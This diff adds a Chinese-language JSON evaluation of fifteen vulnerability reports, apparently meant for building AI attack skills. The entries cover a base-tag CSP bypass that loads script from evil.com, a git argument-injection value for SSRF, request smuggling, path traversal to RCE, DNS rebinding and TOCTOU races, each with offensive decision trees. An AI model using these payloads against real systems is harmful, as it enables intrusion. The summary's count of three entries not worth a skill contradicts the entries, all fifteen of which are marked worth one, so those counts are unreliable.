@@ -1,0 +1,536 @@
+{
+ "summary": {
+  "total": 15,
+  "worth_skill": 12,
+  "not_worth": 3,
+  "top_ids": [
+   1481207,
+   2280391,
+   838510,
+   519220,
+   855276,
+   415202,
+   835005,
+   1069487,
+   2039870,
+   1464396,
+   1061591,
+   185041,
+   1897203,
+   419896,
+   453513
+  ]
+ },
+ "detailed_evaluations": [
+  {
+   "id": 1481207,
+   "knowledge_point": "base标签重写相对URL绕过CSP",
+   "is_ai_likely_known": false,
+   "reason": "base标签绕过CSP的具体利用方式在训练数据中不常见，需要结合Markdown渲染和CSP nonce机制。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（适用于所有允许HTML注入且使用相对URL的场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'base标签重写相对URL'的原理、触发条件、绕过CSP的决策树。",
+   "skill_framework": {
+    "name": "base标签重写相对URL绕过CSP",
+    "适用场景": [
+     "Markdown渲染",
+     "富文本编辑器",
+     "任何允许HTML注入且使用相对URL的场景"
+    ],
+    "核心原理": [
+     "base标签可改变文档中所有相对URL的解析基准",
+     "CSP nonce可能被base标签重写后的URL绕过"
+    ],
+    "决策树": [
+     "IF 存在HTML注入点 AND 页面使用相对URL AND CSP依赖nonce → 尝试插入base标签指向恶意域名"
+    ],
+    "示例": [
+     "<base href='https://evil.com'> 使 <script src='/x.js'> 加载 https://evil.com/x.js"
+    ],
+    "迁移场景": [
+     "XSS",
+     "CSP绕过",
+     "钓鱼"
+    ]
+   }
+  },
+  {
+   "id": 2280391,
+   "knowledge_point": "超长trailer header触发IOException导致请求走私",
+   "is_ai_likely_known": false,
+   "reason": "Tomcat对超长trailer header的异常处理导致请求拆分，属于具体实现细节，训练数据稀少。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于所有基于Tomcat的代理架构，可迁移到其他服务器异常处理）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'服务器异常处理导致请求走私'的模式，包括触发条件和防御措施。",
+   "skill_framework": {
+    "name": "服务器异常处理导致请求走私",
+    "适用场景": [
+     "HTTP请求走私",
+     "代理架构",
+     "负载均衡"
+    ],
+    "核心原理": [
+     "服务器对异常请求的处理不一致导致请求拆分",
+     "超长trailer header触发IOException，服务器可能关闭连接或错误解析"
+    ],
+    "决策树": [
+     "IF 存在代理 AND 后端为Tomcat → 尝试发送超长trailer header观察行为"
+    ],
+    "示例": [
+     "发送包含超长trailer header的请求，观察是否被拆分"
+    ],
+    "迁移场景": [
+     "请求走私",
+     "缓存投毒",
+     "会话劫持"
+    ]
+   }
+  },
+  {
+   "id": 838510,
+   "knowledge_point": "联邦共享share_type错误导致密码策略绕过",
+   "is_ai_likely_known": false,
+   "reason": "Nextcloud联邦共享的share_type错误设置导致密码绕过，属于具体业务逻辑漏洞，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "中（可迁移到其他联邦共享或类似业务逻辑）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'业务逻辑绕过密码策略'的模式，强调检查所有共享类型。",
+   "skill_framework": {
+    "name": "业务逻辑绕过密码策略",
+    "适用场景": [
+     "文件共享",
+     "协作平台",
+     "任何有密码策略的业务"
+    ],
+    "核心原理": [
+     "不同共享类型可能绕过统一密码策略",
+     "share_type错误导致生成无密码链接"
+    ],
+    "决策树": [
+     "IF 存在密码策略 AND 有多个共享类型 → 测试每个类型是否强制密码"
+    ],
+    "示例": [
+     "通过联邦共享添加文件，生成无密码链接"
+    ],
+    "迁移场景": [
+     "密码策略绕过",
+     "访问控制",
+     "业务逻辑漏洞"
+    ]
+   }
+  },
+  {
+   "id": 519220,
+   "knowledge_point": "URL编码绕过路径遍历结合缓存写入实现RCE",
+   "is_ai_likely_known": false,
+   "reason": "URL编码绕过路径过滤并利用缓存机制写入任意文件，属于组合攻击，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何有缓存机制和路径过滤的场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'路径遍历+缓存写入'的攻击链，强调URL规范化。",
+   "skill_framework": {
+    "name": "路径遍历+缓存写入实现RCE",
+    "适用场景": [
+     "缓存机制",
+     "文件写入",
+     "模板引擎"
+    ],
+    "核心原理": [
+     "URL编码绕过路径过滤",
+     "缓存文件路径可控，可覆盖模板文件"
+    ],
+    "决策树": [
+     "IF 存在路径过滤 AND 有缓存机制 → 尝试编码绕过并写入缓存文件"
+    ],
+    "示例": [
+     "构造编码URL写入缓存文件覆盖ERB模板"
+    ],
+    "迁移场景": [
+     "RCE",
+     "路径遍历",
+     "缓存投毒"
+    ]
+   }
+  },
+  {
+   "id": 855276,
+   "knowledge_point": "git config URL注入实现SSRF",
+   "is_ai_likely_known": false,
+   "reason": "利用git config的http.<url>.*设置注入代理配置，属于具体命令行参数解析漏洞，训练数据稀少。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何将用户输入拼接到命令行参数的场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'命令行参数注入'模式，强调对用户输入的严格验证。",
+   "skill_framework": {
+    "name": "命令行参数注入实现SSRF",
+    "适用场景": [
+     "Git集成",
+     "命令行工具",
+     "任何拼接用户输入到命令的场景"
+    ],
+    "核心原理": [
+     "用户输入可注入git config设置",
+     "设置代理后git clone可访问内部服务"
+    ],
+    "决策树": [
+     "IF 存在用户可控URL AND 拼接进命令行 → 尝试注入config参数"
+    ],
+    "示例": [
+     "import_url=http://evil.com -c http.proxy=http://internal:8080"
+    ],
+    "迁移场景": [
+     "SSRF",
+     "命令注入",
+     "配置注入"
+    ]
+   }
+  },
+  {
+   "id": 415202,
+   "knowledge_point": "多阶段攻击链：路径遍历→对象注入→XXE→SSRF→反序列化RCE",
+   "is_ai_likely_known": false,
+   "reason": "完整攻击链涉及多个组件和信任边界，每一步都有特定技术，训练数据难以覆盖。",
+   "scene_frequency": "低频",
+   "migration_potential": "高（可抽象为多阶段攻击链模式，适用于复杂系统）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'多阶段攻击链'的构建方法，强调信任边界和组件交互。",
+   "skill_framework": {
+    "name": "多阶段攻击链构建",
+    "适用场景": [
+     "复杂系统",
+     "微服务",
+     "多组件交互"
+    ],
+    "核心原理": [
+     "每个阶段利用不同漏洞逐步深入",
+     "信任边界是攻击链的关键节点"
+    ],
+    "决策树": [
+     "IF 存在多个组件 AND 有信任边界 → 尝试从外围到内部逐步突破"
+    ],
+    "示例": [
+     "路径遍历→对象注入→XXE→SSRF→反序列化RCE"
+    ],
+    "迁移场景": [
+     "渗透测试",
+     "红队",
+     "漏洞研究"
+    ]
+   }
+  },
+  {
+   "id": 835005,
+   "knowledge_point": "GraphQL泄露内部ID结合IDOR实现组织接管",
+   "is_ai_likely_known": false,
+   "reason": "GraphQL信息泄露与IDOR组合攻击，训练数据不常见，需要理解GraphQL特性。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于所有使用GraphQL的API，可迁移到其他IDOR场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'GraphQL信息泄露+IDOR'模式，强调服务端权限校验。",
+   "skill_framework": {
+    "name": "GraphQL信息泄露+IDOR",
+    "适用场景": [
+     "GraphQL API",
+     "组织管理",
+     "权限提升"
+    ],
+    "核心原理": [
+     "GraphQL可能暴露内部ID",
+     "API未校验用户对目标资源的权限"
+    ],
+    "决策树": [
+     "IF 使用GraphQL AND 存在组织ID → 尝试直接引用其他组织ID"
+    ],
+    "示例": [
+     "通过GraphQL查询泄露组织ID，然后修改邀请请求中的organization字段"
+    ],
+    "迁移场景": [
+     "IDOR",
+     "信息泄露",
+     "权限提升"
+    ]
+   }
+  },
+  {
+   "id": 1069487,
+   "knowledge_point": "DNS rebinding绕过localhost白名单",
+   "is_ai_likely_known": false,
+   "reason": "利用localhost6不在hosts文件中的特性进行DNS rebinding，属于具体绕过技巧，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何基于主机名白名单的访问控制）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'DNS rebinding绕过白名单'模式，强调使用IP绑定或更强验证。",
+   "skill_framework": {
+    "name": "DNS rebinding绕过主机名白名单",
+    "适用场景": [
+     "调试器",
+     "内部服务",
+     "任何基于主机名白名单的访问控制"
+    ],
+    "核心原理": [
+     "DNS rebinding使同一域名解析到不同IP",
+     "localhost6不在hosts文件中，可被当作普通域名"
+    ],
+    "决策树": [
+     "IF 存在主机名白名单 AND 使用DNS解析 → 尝试DNS rebinding"
+    ],
+    "示例": [
+     "使用localhost6:9229进行DNS rebinding绕过白名单"
+    ],
+    "迁移场景": [
+     "SSRF",
+     "访问控制",
+     "认证绕过"
+    ]
+   }
+  },
+  {
+   "id": 2039870,
+   "knowledge_point": "renameat2原子交换制造TOCTOU竞态",
+   "is_ai_likely_known": false,
+   "reason": "利用renameat2的RENAME_EXCHANGE原子交换制造竞态窗口，属于高级系统调用利用，训练数据稀少。",
+   "scene_frequency": "低频",
+   "migration_potential": "高（适用于任何存在TOCTOU的代码，可迁移到文件操作）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'原子交换制造TOCTOU'模式，强调使用openat等原子操作。",
+   "skill_framework": {
+    "name": "原子交换制造TOCTOU",
+    "适用场景": [
+     "文件操作",
+     "符号链接",
+     "竞态条件"
+    ],
+    "核心原理": [
+     "renameat2的RENAME_EXCHANGE原子交换两个路径",
+     "在stat和fopen之间制造竞态窗口"
+    ],
+    "决策树": [
+     "IF 存在stat后fopen的模式 AND 攻击者可控制文件系统 → 尝试使用renameat2交换"
+    ],
+    "示例": [
+     "交换符号链接和目录，使stat看到目录而fopen打开符号链接指向的文件"
+    ],
+    "迁移场景": [
+     "TOCTOU",
+     "文件覆盖",
+     "权限提升"
+    ]
+   }
+  },
+  {
+   "id": 1464396,
+   "knowledge_point": "Cookie前缀欺骗通过URL编码",
+   "is_ai_likely_known": false,
+   "reason": "利用CGI::Cookie.parse对cookie名进行URL解码导致前缀欺骗，属于具体解析行为，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何解析cookie的框架，可迁移到其他协议解析）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'协议解析差异导致前缀欺骗'模式，强调解析一致性。",
+   "skill_framework": {
+    "name": "协议解析差异导致前缀欺骗",
+    "适用场景": [
+     "Cookie解析",
+     "HTTP头解析",
+     "任何协议解析"
+    ],
+    "核心原理": [
+     "解析器对输入进行解码，导致前缀欺骗",
+     "安全前缀可能被绕过"
+    ],
+    "决策树": [
+     "IF 存在安全前缀检查 AND 解析器会解码 → 尝试URL编码绕过"
+    ],
+    "示例": [
+     "构造编码cookie名，解析后与安全前缀相同"
+    ],
+    "迁移场景": [
+     "认证绕过",
+     "协议解析",
+     "安全前缀"
+    ]
+   }
+  },
+  {
+   "id": 1061591,
+   "knowledge_point": "预填充凭据导致跨用户凭据混淆",
+   "is_ai_likely_known": false,
+   "reason": "Nextcloud用户列表页面预填充凭据导致管理员凭据被存储为所有用户的SMB凭据，属于具体业务逻辑漏洞，训练数据不常见。",
+   "scene_frequency": "低频",
+   "migration_potential": "中（可迁移到其他预填充凭据的场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'预填充凭据导致凭据混淆'模式，强调避免预填充敏感信息。",
+   "skill_framework": {
+    "name": "预填充凭据导致凭据混淆",
+    "适用场景": [
+     "用户管理",
+     "外部存储",
+     "凭据管理"
+    ],
+    "核心原理": [
+     "预填充凭据可能被错误关联到其他用户",
+     "跨组件信任边界导致凭据泄露"
+    ],
+    "决策树": [
+     "IF 存在预填充凭据功能 AND 多用户共享 → 检查凭据是否与当前用户匹配"
+    ],
+    "示例": [
+     "用户列表页面预填充管理员凭据，导致所有用户获得管理员SMB凭据"
+    ],
+    "迁移场景": [
+     "凭据泄露",
+     "权限提升",
+     "业务逻辑漏洞"
+    ]
+   }
+  },
+  {
+   "id": 185041,
+   "knowledge_point": "宏定义覆盖导致类型混淆",
+   "is_ai_likely_known": false,
+   "reason": "利用宏定义可覆盖将异常类改为非异常类型，导致mrb_exc_set类型混淆，属于具体实现细节，训练数据稀少。",
+   "scene_frequency": "低频",
+   "migration_potential": "中（可迁移到其他宏定义覆盖场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'宏定义覆盖导致类型混淆'模式，强调宏定义应使用常量。",
+   "skill_framework": {
+    "name": "宏定义覆盖导致类型混淆",
+    "适用场景": [
+     "解释器",
+     "宏定义",
+     "类型安全"
+    ],
+    "核心原理": [
+     "宏定义可被用户代码覆盖",
+     "类型检查缺失导致内存破坏"
+    ],
+    "决策树": [
+     "IF 存在宏定义 AND 用户可覆盖 → 尝试覆盖为不同类型"
+    ],
+    "示例": [
+     "重新定义异常类为非异常类型，触发mrb_exc_set类型混淆"
+    ],
+    "迁移场景": [
+     "内存破坏",
+     "RCE",
+     "类型混淆"
+    ]
+   }
+  },
+  {
+   "id": 1897203,
+   "knowledge_point": "多线程竞争导致HSTS double-free",
+   "is_ai_likely_known": false,
+   "reason": "HSTS处理在多线程下缺乏互斥导致double-free，属于具体并发缺陷，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何多线程共享资源场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'多线程竞争导致内存破坏'模式，强调加锁或使用线程安全数据结构。",
+   "skill_framework": {
+    "name": "多线程竞争导致内存破坏",
+    "适用场景": [
+     "多线程应用",
+     "共享资源",
+     "内存安全"
+    ],
+    "核心原理": [
+     "多线程同时操作共享资源未加锁",
+     "导致double-free或UAF"
+    ],
+    "决策树": [
+     "IF 存在多线程 AND 共享资源无锁 → 尝试并发操作触发竞态"
+    ],
+    "示例": [
+     "多线程同时处理HSTS条目导致double-free"
+    ],
+    "迁移场景": [
+     "内存破坏",
+     "DoS",
+     "RCE"
+    ]
+   }
+  },
+  {
+   "id": 419896,
+   "knowledge_point": "数组null字节绕过present?触发IS NULL查询",
+   "is_ai_likely_known": false,
+   "reason": "利用数组包含null字节绕过present?检查，导致find_by执行IS NULL查询，属于类型混淆逻辑绕过，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何使用present?或类似检查的Rails应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'类型混淆绕过逻辑检查'模式，强调严格类型验证。",
+   "skill_framework": {
+    "name": "类型混淆绕过逻辑检查",
+    "适用场景": [
+     "Rails应用",
+     "参数验证",
+     "逻辑绕过"
+    ],
+    "核心原理": [
+     "数组参数可能绕过present?检查",
+     "导致IS NULL查询加载任意记录"
+    ],
+    "决策树": [
+     "IF 存在present?检查 AND 参数可为数组 → 尝试传入数组包含null字节"
+    ],
+    "示例": [
+     "构造数组参数绕过present?，触发IS NULL查询加载他人草稿"
+    ],
+    "迁移场景": [
+     "IDOR",
+     "认证绕过",
+     "逻辑漏洞"
+    ]
+   }
+  },
+  {
+   "id": 453513,
+   "knowledge_point": "keep-alive连接绕过headersTimeout",
+   "is_ai_likely_known": false,
+   "reason": "Node.js的headersTimeout修复在keep-alive连接上可被绕过，因为parsingHeadersStart未重置，属于具体状态管理缺陷，训练数据不常见。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（适用于任何基于超时机制的服务器）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成Skill，固化'超时状态未重置导致绕过'模式，强调每个请求重置超时状态。",
+   "skill_framework": {
+    "name": "超时状态未重置导致绕过",
+    "适用场景": [
+     "Node.js服务器",
+     "超时机制",
+     "DoS防护"
+    ],
+    "核心原理": [
+     "keep-alive连接上超时状态未重置",
+     "导致headersTimeout失效"
+    ],
+    "决策树": [
+     "IF 存在超时机制 AND 支持keep-alive → 尝试在keep-alive连接上发送慢请求"
+    ],
+    "示例": [
+     "建立keep-alive连接，发送部分请求，等待超时，再发送剩余部分，服务器不关闭连接"
+    ],
+    "迁移场景": [
+     "DoS",
+     "超时绕过",
+     "资源消耗"
+    ]
+   }
+  }
+ ]
+}
